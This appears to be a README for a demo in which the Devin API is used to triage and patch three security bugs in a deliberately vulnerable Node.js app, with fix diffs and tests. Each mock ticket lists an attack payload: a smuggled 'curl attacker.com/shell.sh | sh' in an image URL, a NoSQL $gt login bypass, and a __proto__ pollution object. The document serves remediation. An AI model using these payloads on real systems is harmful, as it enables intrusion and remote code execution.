# Devin API — L3 Bug Triage Demo

This walkthrough demonstrates how Devin can be invoked programmatically via the
[Devin API](https://docs.devin.ai/api-reference/overview) to investigate and fix
complex (L3-level) security bugs, simulating an automated incident-response pipeline.

**Story:** Support ticket comes in &#8594; API triggers Devin &#8594; Devin investigates and fixes &#8594; PR is created automatically.

---

## Architecture

```
 Support/Incident System          Devin API            Devin Agent
 ========================    ==================    ===================
 Ticket created (PagerDuty,  POST /v1/sessions     - Clones repo
 Jira, Slack alert, etc.)    with bug description  - Reads logs/code
        |                          |                - Traces root cause
        +--- webhook/script ------>+                - Implements fix
                                   |                - Writes tests
                                   +--------------->- Creates PR
                                                    - Reports back
```

---

## The Bugs (Mock Support Tickets)

### TICKET-4501 — Remote Code Execution via TODO image processing
| Field | Value |
|-------|-------|
| Severity | Critical |
| Component | `routes/index.js` &#8594; `exports.create` |
| Root Cause | `child_process.exec('identify ' + url)` concatenates unsanitized user input into a shell command |
| Attack Vector | `![alt text](http://x.co/img.png; curl attacker.com/shell.sh \| sh "title")` |
| Fix | Replace `exec()` with `execFile()` and pass the URL as an argument array so shell metacharacters are treated as literal strings |

### TICKET-4502 — NoSQL Injection bypasses authentication on /login
| Field | Value |
|-------|-------|
| Severity | Critical |
| Component | `routes/index.js` &#8594; `exports.loginHandler` |
| Root Cause | `req.body.username` and `req.body.password` are passed directly to `User.find()` without type checking |
| Attack Vector | `{"username": {"$gt": ""}, "password": {"$gt": ""}}` bypasses auth |
| Fix | Explicitly extract username/password and reject non-string types before querying MongoDB |

### TICKET-4503 — Prototype Pollution via chat endpoint
| Field | Value |
|-------|-------|
| Severity | High |
| Component | `routes/index.js` &#8594; `exports.chat.add` |
| Root Cause | `_.merge(message, req.body.message, ...)` merges attacker-controlled input including `__proto__` |
| Attack Vector | `{"message": {"__proto__": {"isAdmin": true}}}` pollutes Object.prototype |
| Fix | Sanitize input by stripping `__proto__`, `constructor`, and `prototype` keys before merging |

---

## API Invocation Script

The script at [`demo/trigger_devin_triage.py`](demo/trigger_devin_triage.py) automates the full flow.

### Prerequisites

```bash
pip install requests
export DEVIN_API_KEY="your-api-key"
```

### Running

```bash
python3 demo/trigger_devin_triage.py
```

### What the script does

1. Defines three support tickets as structured dicts.
2. For each ticket, calls `POST https://api.devin.ai/v1/sessions` with a detailed prompt:

```json
{
  "prompt": "You are investigating a critical security ticket.\n\n## Ticket: TICKET-4501 ...",
  "idempotent": true
}
```

3. Polls `GET /v1/sessions/{session_id}` until each session reaches `finished` or `blocked`.
4. Prints a summary with session URLs and PR links.

### Example API Payload (TICKET-4501)

```bash
curl -X POST "https://api.devin.ai/v1/sessions" \
  -H "Authorization: Bearer $DEVIN_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "prompt": "You are investigating a critical security ticket.\n\nTicket: TICKET-4501 — Remote Code Execution via TODO image processing\nSeverity: Critical\n\nThe server passes user input directly to child_process.exec() in routes/index.js.\n\n1. Clone https://github.com/COG-GTM/nodejs-goof\n2. Examine exports.create in routes/index.js\n3. Replace exec() with execFile() using an argument array\n4. Write tests proving shell metacharacters are not interpreted\n5. Create a PR with the fix.",
    "idempotent": true
  }'
```

### Example Response

```json
{
  "session_id": "devin-abc123...",
  "url": "https://app.devin.ai/sessions/abc123..."
}
```

---

## Devin's Investigation Process

For each ticket, Devin follows these steps:

1. **Clone & orient** — clones the repo, reads `package.json` and `routes/index.js`
2. **Trace the vulnerability** — follows the data flow from HTTP input to the dangerous sink
3. **Identify root cause** — determines exactly which function/line is vulnerable and why
4. **Implement fix** — makes minimal, targeted code changes
5. **Write tests** — adds tests in `tests/security-fixes.test.js` proving the fix works
6. **Create PR** — pushes a branch and opens a pull request with the fix

---

## The Fixes (in this PR)

### Fix 1: Command Injection (`routes/index.js`)

```diff
- exec('identify ' + url, function (err, stdout, stderr) {
+ execFile('identify', [url], function (err, stdout, stderr) {
```

`execFile` does not spawn a shell, so metacharacters like `;`, `|`, `$()` in the URL are
passed as a literal argument to the `identify` binary.

### Fix 2: NoSQL Injection (`routes/index.js`)

```diff
  exports.loginHandler = function (req, res, next) {
+   var username = req.body.username;
+   var password = req.body.password;
+
+   if (typeof username !== 'string' || typeof password !== 'string') {
+     return res.status(401).send();
+   }
+
-   if (validator.isEmail(req.body.username)) {
-     User.find({ username: req.body.username, password: req.body.password }, ...
+   if (validator.isEmail(username)) {
+     User.find({ username: username, password: password }, ...
```

MongoDB query operators like `{$gt: ""}` are objects, not strings. The type check
rejects them before they reach `User.find()`.

### Fix 3: Prototype Pollution (`routes/index.js`)

```diff
+   var sanitizedMessage = {};
+   var rawMessage = req.body.message || {};
+   Object.keys(rawMessage).forEach(function(key) {
+     if (key !== '__proto__' && key !== 'constructor' && key !== 'prototype') {
+       sanitizedMessage[key] = rawMessage[key];
+     }
+   });
+
-   _.merge(message, req.body.message, {
+   _.merge(message, sanitizedMessage, {
```

Dangerous keys are stripped before `_.merge()` processes them, preventing
`Object.prototype` pollution.

---

## Test Coverage

Tests in `tests/security-fixes.test.js` verify:

| Test | What it proves |
|------|---------------|
| `execFile` with shell metacharacters | `;`, `$()` are treated as literal strings |
| NoSQL operator rejection | `{$gt: ""}` inputs return 401 |
| String credentials accepted | Normal login flow still works |
| `__proto__` stripping | Pollution payload is removed |
| `constructor` stripping | Alternative pollution vector blocked |
| Object.prototype not polluted | `{}.isAdmin` remains `undefined` after merge |

---

## Integration Patterns

This demo can be adapted for production use:

- **PagerDuty/OpsGenie webhook** &#8594; Lambda/Cloud Function &#8594; Devin API
- **Jira automation rule** &#8594; on ticket create &#8594; Devin API
- **Slack bot** &#8594; `@Devin triage this: <alert details>` &#8594; Devin API
- **GitHub Actions** &#8594; on `issues.opened` with label `l3-triage` &#8594; Devin API
